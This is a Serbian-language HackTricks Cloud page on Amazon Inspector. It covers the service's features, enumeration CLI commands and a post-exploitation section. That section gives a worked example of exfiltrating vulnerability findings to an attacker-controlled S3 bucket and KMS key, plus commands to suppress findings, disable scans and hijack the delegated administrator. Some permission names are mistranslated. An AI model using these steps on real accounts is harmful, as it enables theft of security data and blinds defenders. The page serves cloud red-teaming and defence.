# AWS - Inspector Enum

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Inspector

Amazon Inspector je napredna, automatizovana usluga upravljanja ranjivostima dizajnirana da unapredi sigurnost vašeg AWS okruženja. Ova usluga kontinuirano skenira Amazon EC2 instance, kontejnerske slike u Amazon ECR-u, Amazon ECS i AWS Lambda funkcije radi otkrivanja ranjivosti i neželjenog izlaganja mreže. Korišćenjem robustne baze podataka o ranjivostima, Amazon Inspector pruža detaljne nalaze, uključujući nivoe ozbiljnosti i preporuke za otklanjanje, pomažući organizacijama da proaktivno identifikuju i reše sigurnosne rizike. Ovaj sveobuhvatan pristup osigurava ojačanu sigurnosnu postavku širom različitih AWS usluga, pomažući u usklađenosti i upravljanju rizicima.

## Ključni elementi

### Nalazi

Nalazi u Amazon Inspector-u su detaljni izveštaji o ranjivostima i izloženostima otkrivenim tokom skeniranja EC2 instanci, ECR repozitorijuma ili Lambda funkcija. Na osnovu svog stanja, nalazi se kategorizuju kao:

- **Aktivni**: Nalaz nije otklonjen.
- **Zatvoreni**: Nalaz je otklonjen.
- **Potisnuti**: Nalaz je označen ovim stanjem zbog jednog ili više **pravila potiskivanja**.

Nalazi se takođe kategorizuju u sledeće tri vrste:

- **Paket**: Ovi nalazi se odnose na ranjivosti u softverskim paketima instaliranim na vašim resursima. Primeri uključuju zastarele biblioteke ili zavisnosti sa poznatim sigurnosnim problemima.
- **Kod**: Ova kategorija uključuje ranjivosti pronađene u kodu aplikacija koje se izvršavaju na vašim AWS resursima. Uobičajeni problemi su greške u kodiranju ili nesigurne prakse koje bi mogle dovesti do sigurnosnih propusta.
- **Mreža**: Nalazi u mreži identifikuju potencijalna izlaganja u konfiguracijama mreže koja bi mogla biti iskorišćena od strane napadača. To uključuje otvorene portove, nesigurne mrežne protokole i loše konfigurisane sigurnosne grupe.

### Filteri i pravila potiskivanja

Filteri i pravila potiskivanja u Amazon Inspector-u pomažu u upravljanju i prioritetizaciji nalaza. Filteri vam omogućavaju da precizirate nalaze na osnovu određenih kriterijuma, kao što su ozbiljnost ili tip resursa. Pravila potiskivanja vam omogućavaju da potisnete određene nalaze koji se smatraju niskim rizikom, već su otklonjeni ili iz bilo kog drugog važnog razloga, sprečavajući ih da preopterete vaše sigurnosne izveštaje i omogućavajući vam da se fokusirate na važnije probleme.

### Softverski račun materijala (SBOM)

Softverski račun materijala (SBOM) u Amazon Inspector-u je izvozna ugnježdena inventarna lista koja detaljno opisuje sve komponente unutar softverskog paketa, uključujući biblioteke i zavisnosti. SBOM-ovi pomažu u pružanju transparentnosti u lanac snabdevanja softverom, omogućavajući bolje upravljanje ranjivostima i usklađenost. Oni su ključni za identifikaciju i ublažavanje rizika povezanih sa otvorenim kodom i softverskim komponentama trećih strana.

## Ključne funkcije

### Izvoz nalaza

Amazon Inspector nudi mogućnost izvoza nalaza u Amazon S3 kofere, Amazon EventBridge i AWS Security Hub, što vam omogućava generisanje detaljnih izveštaja o identifikovanim ranjivostima i izloženostima radi dalje analize ili deljenja u određenom datumu i vremenu. Ova funkcija podržava različite formate izlaza kao što su CSV i JSON, čime se olakšava integracija sa drugim alatima i sistemima. Funkcionalnost izvoza omogućava prilagođavanje podataka uključenih u izveštaje, omogućavajući vam da filtrirate nalaze na osnovu specifičnih kriterijuma poput ozbiljnosti, tipa resursa ili vremenskog opsega i podrazumevano uključivanje svih vaših nalaza u trenutnom AWS regionu sa statusom Aktivni.

Prilikom izvoza nalaza, neophodan je KMS ključ za šifrovanje podataka tokom izvoza. KMS ključevi osiguravaju da izvezeni nalazi budu zaštićeni od neovlašćenog pristupa, pružajući dodatni sloj sigurnosti za osetljive informacije o ranjivostima.

### Skeniranje Amazon EC2 instanci

Amazon Inspector nudi snažne mogućnosti skeniranja za Amazon EC2 instance radi otkrivanja ranjivosti i sigurnosnih problema. Inspector upoređuje izvučene metapodatke sa EC2 instance sa pravilima iz sigurnosnih saveta kako bi proizveo ranjivosti paketa i probleme dostupnosti mreže. Ovi skenovi se mogu izvršiti putem **agent-based** ili **agentless** metoda, u zavisnosti od konfiguracije postavki **režima skeniranja** vašeg naloga.

- **Agent-Based**: Koristi AWS Systems Manager (SSM) agent za obavljanje detaljnih skenova. Ovaj metod omogućava sveobuhvatno prikupljanje podataka i analizu direktno sa instance.
- **Agentless**: Pruža lagano alternativno rešenje koje ne zahteva instaliranje agenta na instanci, stvarajući EBS snimak svake zapremine EC2 instance, tražeći ranjivosti, a zatim je brišući; koristeći postojeću AWS infrastrukturu za skeniranje.

Režim skeniranja određuje koji metod će se koristiti za izvođenje EC2 skenova:

- **Agent-Based**: Uključuje instaliranje SSM agenta na EC2 instancama za dubinsku inspekciju.
- **Hibridno skeniranje**: Kombinuje oba metoda, agent-based i agentless, kako bi se maksimizirala pokrivenost i minimizirao uticaj na performanse. Na EC2 instancama gde je SSM agent instaliran, Inspector će izvršiti skeniranje na bazi agenta, a na onima gde nema SSM agenta, izvršiće se skeniranje bez agenta.

Još jedna važna funkcija je **dubinska inspekcija** za EC2 Linux instance. Ova funkcija nudi temeljnu analizu softvera i konfiguracije EC2 Linux instanci, pružajući detaljne procene ranjivosti, uključujući ranjivosti operativnog sistema, ranjivosti aplikacija i loše konfiguracije, osiguravajući sveobuhvatnu sigurnosnu procenu. Ovo se postiže inspekcijom **prilagođenih putanja** i svih njenih poddirektorijuma. Podrazumevano, Amazon Inspector će skenirati sledeće, ali svaki član računa može definisati do 5 dodatnih prilagođenih putanja, a svaki delegirani administrator do 10:

- `/usr/lib`
- `/usr/lib64`
- `/usr/local/lib`
- `/usr/local/lib64`

### Skeniranje kontejnerskih slika Amazon ECR-a

Amazon Inspector pruža snažne mogućnosti skeniranja za kontejnerske slike Amazon Elastic Container Registry (ECR), osiguravajući da se ranjivosti paketa otkriju i efikasno upravljaju.

- **Osnovno skeniranje**: Ovo je brzo i lagano skeniranje koje identifikuje poznate ranjivosti OS paketa u kontejnerskim slikama koristeći standardni set pravila iz Clair projekta otvorenog koda. Sa ovom konfiguracijom skeniranja, vaše repozitorijume će biti skenirane prilikom slanja ili izvršavanja ručnih skenova.
- **Unapređeno skeniranje**: Ova opcija dodaje funkciju kontinuiranog skeniranja pored skeniranja prilikom slanja. Unapređeno skeniranje dublje ulazi u slojeve svake kontejnerske slike kako bi identifikovalo ranjivosti u OS paketima i paketima programskih jezika sa većom tačnošću. Analizira kako osnovnu sliku, tako i sve dodatne slojeve, pružajući sveobuhvatan pregled potencijalnih sigurnosnih problema.

### Skeniranje Lambda funkcija Amazon-a

Amazon Inspector uključuje sveobuhvatne mogućnosti skeniranja za AWS Lambda funkcije i njene slojeve, osiguravajući sigurnost i integritet serverless aplikacija. Inspector nudi dva tipa skeniranja za Lambda funkcije:

- **Standardno skeniranje Lambda funkcija**: Ova podrazumevana funkcija identifikuje softverske ranjivosti u zavisnostima paketa aplikacije dodatih vašoj Lambda funkciji i slojevima. Na primer, ako vaša funkcija koristi verziju biblioteke kao što je python-jwt sa poznatom ranjivošću, generiše nalaz.
- **Skeniranje koda Lambda funkcija**: Analizira prilagođeni kod aplikacije radi otkrivanja sigurnosnih problema, identifikujući ranjivosti poput grešaka u ubacivanju, curenja podataka, slabe kriptografije i nedostatka šifrovanja. Snima isečke koda koji ističu otkrivene ranjivosti, kao što su tvrdo kodirane akreditacije. Nalazi uključuju detaljne preporuke za otklanjanje i isečke koda za popravku problema.
### **Skeniranja Centra za internet bezbednost (CIS)**

Amazon Inspector uključuje CIS skeniranja kako bi uporedio operativne sisteme instanci Amazon EC2 sa preporukama najbolje prakse Centra za internet bezbednost (CIS). Ova skeniranja osiguravaju da konfiguracije odgovaraju osnovnim bezbednosnim osnovama standarda industrije.

- **Konfiguracija**: CIS skeniranja procenjuju da li konfiguracije sistema ispunjavaju određene preporuke CIS Benchmark-a, pri čemu je svaka provera povezana sa CIS ID-jem i naslovom provere.
- **Izvršenje**: Skeniranja se vrše ili planiraju na osnovu oznaka instanci i definisanih rasporeda.
- **Rezultati**: Rezultati nakon skeniranja pokazuju koje provere su prošle, preskočene ili nisu uspele, pružajući uvid u bezbednosni položaj svake instance.

## Enumeracija
```bash
# Administrator and member accounts #

## Retrieve information about the AWS Inpsector delegated administrator for your organization (ReadOnlyAccess policy is enough for this)
aws inspector2 get-delegated-admin-account

## List the members who are associated with the AWS Inspector administrator account (ReadOnlyAccess policy is enough for this)
aws inspector2 list-members [--only-associated | --no-only-associated]
## Retrieve information about a member account (ReadOnlyAccess policy is enough for this)
aws inspector2 get-member --account-id <value>
## Retrieve the status of AWS accounts within your environment (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-account-status [--account-ids <value>]
## Retrieve the free trial status for the specified accounts (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-free-trial-info --account-ids <value>
## Retrieve the EC2 Deep Inspection status for the member accounts (Requires to be the delegated administrator)
aws inspector2 batch-get-member-ec2-deep-inspection-status [--account-ids <value>]

## List an account's permissions associated with AWS Inspector
aws inspector2 list-account-permissions

# Findings #

## List a subset of information of the findings for your envionment (ReadOnlyAccess policy is enough for this)
aws inspector2 list-findings
## Retrieve vulnerability intelligence details for the specified findings
aws inspector2 batch-get-finding-details --finding-arns <value>
## List statistical and aggregated finding data (ReadOnlyAccess policy is enough for this)
aws inspector2 list-finding-aggregations --aggregation-type <FINDING_TYPE | PACKAGE | TITLE | REPOSITORY | AMI | AWS_EC2_INSTANCE | AWS_ECR_CONTAINER | IMAGE_LAYER\
| ACCOUNT AWS_LAMBDA_FUNCTION | LAMBDA_LAYER> [--account-ids <value>]
## Retrieve code snippet information about one or more specified code vulnerability findings
aws inspector2 batch-get-code-snippet --finding-arns <value>
## Retrieve the status for the specified findings report (ReadOnlyAccess policy is enough for this)
aws inspector2 get-findings-report-status --report-id <value>

# CIS #

## List CIS scan configurations (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scan-configurations
## List the completed CIS scans (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scans
## Retrieve a report from a completed CIS scan
aws inspector2 get-cis-scan-report --scan-arn <value> [--target-accounts <value>]
## Retrieve details about the specific CIS scan over the specified resource
aws inspector2 get-cis-scan-result-details --account-id <value> --scan-arn <value> --target-resource-id <value>
## List CIS scan results broken down by check
aws inspector2 list-cis-scan-results-aggregated-by-checks --scan-arn <value>
## List CIS scan results broken down by target resource
aws inspector2 list-cis-scan-results-aggregated-by-target-resource --scan-arn <value>

# Configuration #

## Describe AWS Inspector settings for AWS Organization (ReadOnlyAccess policy is enough for this)
aws inspector2 describe-organization-configuration
## Retrieve the configuration settings about EC2 scan and ECR re-scan
aws inspector2 get-configuration
## Retrieve EC2 Deep Inspection configuration associated with your account
aws inspector2 get-ec2-deep-inspection-configuration

# Miscellaneous #

## Retrieve the details of a Software Bill of Materials (SBOM) report
aws inspector2 get-sbom-export --report-id <value>

## Retrieve the coverage details for the specified vulnerabilities
aws inspector2 search-vulnerabilities --filter-criteria <vulnerabilityIds=id1,id2..>

## Retrieve the tags attached to the specified resource
aws inspector2 list-tags-for-resource --resource-arn <value>

## Retrieve the AWS KMS key used to encrypt the specified code snippets
aws inspector2 get-encryption-key --resource-type <AWS_EC2_INSTANCE | AWS_ECR_CONTAINER_IMAGE | AWS_ECR_REPOSITORY | AWS_LAMBDA_FUNCTION> --scan-type <NETWORK | PACKAGE | CODE>

## List the filters associated to your AWS account
aws inspector2 list-filters

## List the types of statistics AWS Inspector can generate (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage
## Retrieve statistical data and about the resources AWS Inspector monitors (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage-statistics

## List the aggregated usage total over the last 30 days
aws inspector2 list-usage-totals [--account-ids <value>]

### INSPECTOR CLASSIC ###

## Assessments info, there is a "describe" action for each one to get more info
aws inspector list-assessment-runs
aws inspector list-assessment-targets
aws inspector list-assessment-templates
aws inspector list-event-subscriptions

## Get findings
aws inspector list-findings

## Get exclusions
aws inspector list-exclusions --assessment-run-arn <arn>

## Rule packages
aws inspector list-rules-packages
```
## Post Eksploatacija

{% hint style="success" %}
Sa perspektive napadača, ovaj servis može pomoći napadaču da pronađe ranjivosti i mrežne ekspozicije koje bi mu mogle pomoći da kompromituje druge instance/kontejnere.

Međutim, napadač bi takođe mogao biti zainteresovan za ometanje ovog servisa kako žrtva ne bi mogla videti ranjivosti (sve ili određene).
{% endhint %}

### `inspector2:CreateFindingsReport`, `inspector2:CreateSBOMReport`

Napadač bi mogao generisati detaljne izveštaje o ranjivostima ili softverskim listama materijala (SBOMs) i eksfiltrirati ih iz vašeg AWS okruženja. Ove informacije bi mogle biti iskorišćene za identifikaciju specifičnih slabosti, zastarelog softvera ili nesigurnih zavisnosti, omogućavajući ciljane napade.
```bash
# Findings report
aws inspector2 create-findings-report --report-format <CSV | JSON> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--filter-criteria <value>]
# SBOM report
aws inspector2 create-sbom-report --report-format <CYCLONEDX_1_4 | SPDX_2_3> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--resource-filter-criteria <value>]
```
### Primer

Sledeći primer prikazuje kako eksfiltrirati sve aktivne nalaze iz Amazon Inspector-a do kontrolisanog Amazon S3 Bucket-a napadača sa kontrolisanim Amazon KMS ključem:

1. **Kreirajte Amazon S3 Bucket** i priložite mu politiku kako bi bio pristupačan iz Amazon Inspector-a žrtve:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "allow-inspector",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"s3:PutObject",
"s3:PutObjectAcl",
"s3:AbortMultipartUpload"
],
"Resource": "arn:aws:s3:::inspector-findings/*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
},
"ArnLike": {
"aws:SourceArn": "arn:aws:inspector2:us-east-1:<victim-account-id>:report/*"
}
}
}
]
}
```
2. **Kreirajte Amazon KMS ključ** i priložite mu pravilo kako bi bio upotrebljiv od strane žrtvinog Amazon Inspektora:
```json
{
"Version": "2012-10-17",
"Id": "key-policy",
"Statement": [
{
...
},
{
"Sid": "Allow victim Amazon Inspector to use the key",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
}
}
}
]
}
```
3. Izvršite komandu za **kreiranje izveštaja o nalazima** i eksfiltraciju istog:
```bash
aws --region us-east-1 inspector2 create-findings-report --report-format CSV --s3-destination bucketName=<attacker-bucket-name>,keyPrefix=exfiltration_,kmsKeyArn=arn:aws:kms:us-east-1:123456789012:key/1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f
```
- **Potencijalni uticaj**: Generisanje i eksfiltracija detaljnih izveštaja o ranjivostima i softveru, sticanje uvida u specifične ranjivosti i sigurnosne slabosti.

### `inspector2:CancelFindingsReport`, `inspector2:CancelSbomExport`

Napadač bi mogao da otkaže generisanje određenog izveštaja o nalazima ili SBOM izveštaja, sprečavajući sigurnosne timove da na vreme dobiju informacije o ranjivostima i softverskim listama materijala (SBOMs), odlažući otkrivanje i otklanjanje sigurnosnih problema.
```bash
# Cancel findings report generation
aws inspector2 cancel-findings-report --report-id <value>
# Cancel SBOM report generatiom
aws inspector2 cancel-sbom-export --report-id <value>
```
- **Potencijalni uticaj**: Poremećaj nadzora nad bezbednošću i sprečavanje pravovremene detekcije i otklanjanja bezbednosnih problema.
### `inspector2:CreateFilter`, `inspector2:UpdateFilter`, `inspector2:DeleteFilter`

Napadač sa ovim dozvolama mogao bi manipulisati pravilima filtriranja koja određuju koje ranjivosti i bezbednosni problemi se prijavljuju ili potiskuju (ako je **akcija** postavljena na SUPPRESS, biće kreirano pravilo potiskivanja). Ovo bi moglo sakriti kritične ranjivosti od administratora bezbednosti, olakšavajući iskorišćavanje ovih slabosti bez otkrivanja. Menjanjem ili uklanjanjem važnih filtera, napadač takođe može stvarati buku poplavljivanjem sistema nevažnim nalazima, ometajući efikasni nadzor i odgovor na bezbednosne pretnje.
```bash
# Create
aws inspector2 create-filter --action <NONE | SUPPRESS> --filter-criteria <value> --name <value> [--reason <value>]
# Update
aws inspector2 update-filter --filter-arn <value> [--action <NONE | SUPPRESS>] [--filter-criteria <value>] [--reason <value>]
# Delete
aws inspector2 delete-filter --arn <value>
```
- **Potencijalni uticaj**: Prikrivanje ili suzbijanje kritičnih ranjivosti, ili poplava sistema nevažnim nalazima.

### `inspector2:OnemogućiDelegiranNalogAdministratora`, (`inspector2:OmogućiDelegiranNalogAdministratora` & `organizations:SpisakDelegiranihAdministratora` & `organizations:OmogućiPristupAWSServisu` & `iam:KreirajUloguPovezanuSaServisom`)

Napadač bi mogao značajno poremetiti strukturu upravljanja bezbednošću.

- Onemogućavanjem delegiranog administratorskog naloga, napadač bi mogao sprečiti tim za bezbednost da pristupi i upravlja postavkama i izveštajima Amazon Inspector-a.
- Omogućavanjem neovlašćenog administratorskog naloga, napadaču bi se omogućilo upravljanje bezbednosnim konfiguracijama, potencijalno onemogućavanje skeniranja ili menjanje postavki kako bi se sakrile zlonamerne aktivnosti.

{% hint style="upozorenje" %}

Potrebno je da neovlašćeni nalog bude u istoj Organizaciji kao žrtva kako bi postao delegirani administrator.

Da bi neovlašćeni nalog postao delegirani administrator, takođe je potrebno da nakon što je legitimni delegirani administrator onemogućen, a pre nego što se neovlašćeni nalog omogući kao delegirani administrator, legitimni administrator mora biti odjavljen kao delegirani administrator iz organizacije. Ovo se može uraditi sledećom komandom (**potrebna dozvola `organizations:DeregisterDelegatedAdministrator`**): **`aws organizations deregister-delegated-administrator --account-id <id-legitimnog-naloga> --service-principal [inspector2.amazonaws.com](http://inspector2.amazonaws.com/)`**

{% endhint %}
```bash
# Disable
aws inspector2 disable-delegated-admin-account --delegated-admin-account-id <value>
# Enable
aws inspector2 enable-delegated-admin-account --delegated-admin-account-id <value>
```
- **Potencijalni uticaj**: Poremećaj upravljanja bezbednošću.

### `inspector2:AssociateMember`, `inspector2:DisassociateMember`

Napadač bi mogao manipulisati udruživanjem članskih naloga unutar organizacije Amazon Inspector. Udruživanjem neovlašćenih naloga ili razdvajanjem legitimnih, napadač bi mogao kontrolisati koji se nalozi uključuju u bezbednosne skenove i izveštavanje. To bi moglo rezultirati time da se kritični nalozi isključe iz bezbednosnog nadgledanja, omogućavajući napadaču da iskoristi ranjivosti u tim nalozima bez otkrivanja.

{% hint style="warning" %}

Ova radnja zahteva da je izvrši delegirani administrator.

{% endhint %}
```bash
# Associate
aws inspector2 associate-member --account-id <value>
# Disassociate
aws inspector2 disassociate-member --account-id <value>
```
- **Potencijalni uticaj**: Isključenje ključnih naloga iz sigurnosnih skeniranja, omogućavajući neotkrivenu eksploataciju ranjivosti.

### `inspector2:Onemogući`, (`inspector2:Omogući` & `iam:KreirajServiceLinkedUlogu`)

Napadač sa dozvolom `inspector2:Onemogući` bio bi u mogućnosti da onemogući sigurnosna skeniranja na određenim tipovima resursa (EC2, ECR, Lambda, Lambda kod) preko određenih naloga, ostavljajući delove AWS okruženja nenadgledanim i ranjivim na napade. Pored toga, posedovanjem dozvola **`inspector2:Omogući`** & **`iam:KreirajServiceLinkedUlogu`**, napadač bi zatim mogao ponovo omogućiti skeniranja selektivno kako bi izbegao otkrivanje sumnjivih konfiguracija.

{% hint style="warning" %}
Ova akcija zahteva da je izvrši delegirani administrator.
{% endhint %}
```bash
# Disable
aws inspector2 disable --account-ids <value> [--resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}>]
# Enable
aws inspector2 enable --resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}> [--account-ids <value>]
```
- **Potencijalni uticaj**: Stvaranje slepih tačaka u bezbednosnom nadgledanju.

### `inspector2:UpdateOrganizationConfiguration`

Napadač sa ovlašćenjem bi mogao da ažurira konfiguracije za vašu Amazon Inspector organizaciju, utičući na podrazumevane funkcije skeniranja omogućene za nove članske naloge.

{% hint style="warning" %}

Ovu radnju mora izvršiti delegirani administrator.

{% endhint %}
```bash
aws inspector2 update-organization-configuration --auto-enable <ec2=true|false,ecr=true|false,lambda=true|false,lambdaCode=true|false>
```
- **Potencijalni uticaj**: Menjanje politika i konfiguracija bezbednosnog skeniranja za organizaciju.

### `inspector2:TagResource`, `inspector2:UntagResource`

Napadač bi mogao da manipuliše oznakama na AWS Inspector resursima, koje su ključne za organizovanje, praćenje i automatizaciju bezbednosnih procena. Menjanjem ili uklanjanjem oznaka, napadač bi potencijalno mogao da sakrije ranjivosti od bezbednosnih skeniranja, poremeti izveštavanje o usklađenosti i ometa automatizovane procese remedijacije, što može dovesti do nekontrolisanih bezbednosnih problema i ugrožene celovitosti sistema.
```bash
aws inspector2 tag-resource --resource-arn <value> --tags <value>
aws inspector2 untag-resource --resource-arn <value> --tag-keys <value>
```
- **Potencijalni uticaj**: Skrivanje ranjivosti, poremećaj izveštavanja o usklađenosti, poremećaj automatizacije bezbednosti i poremećaj alokacije troškova.

# Reference
- [https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html](https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html)
- [https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazoninspector2.html](https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazoninspector2.html)


<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
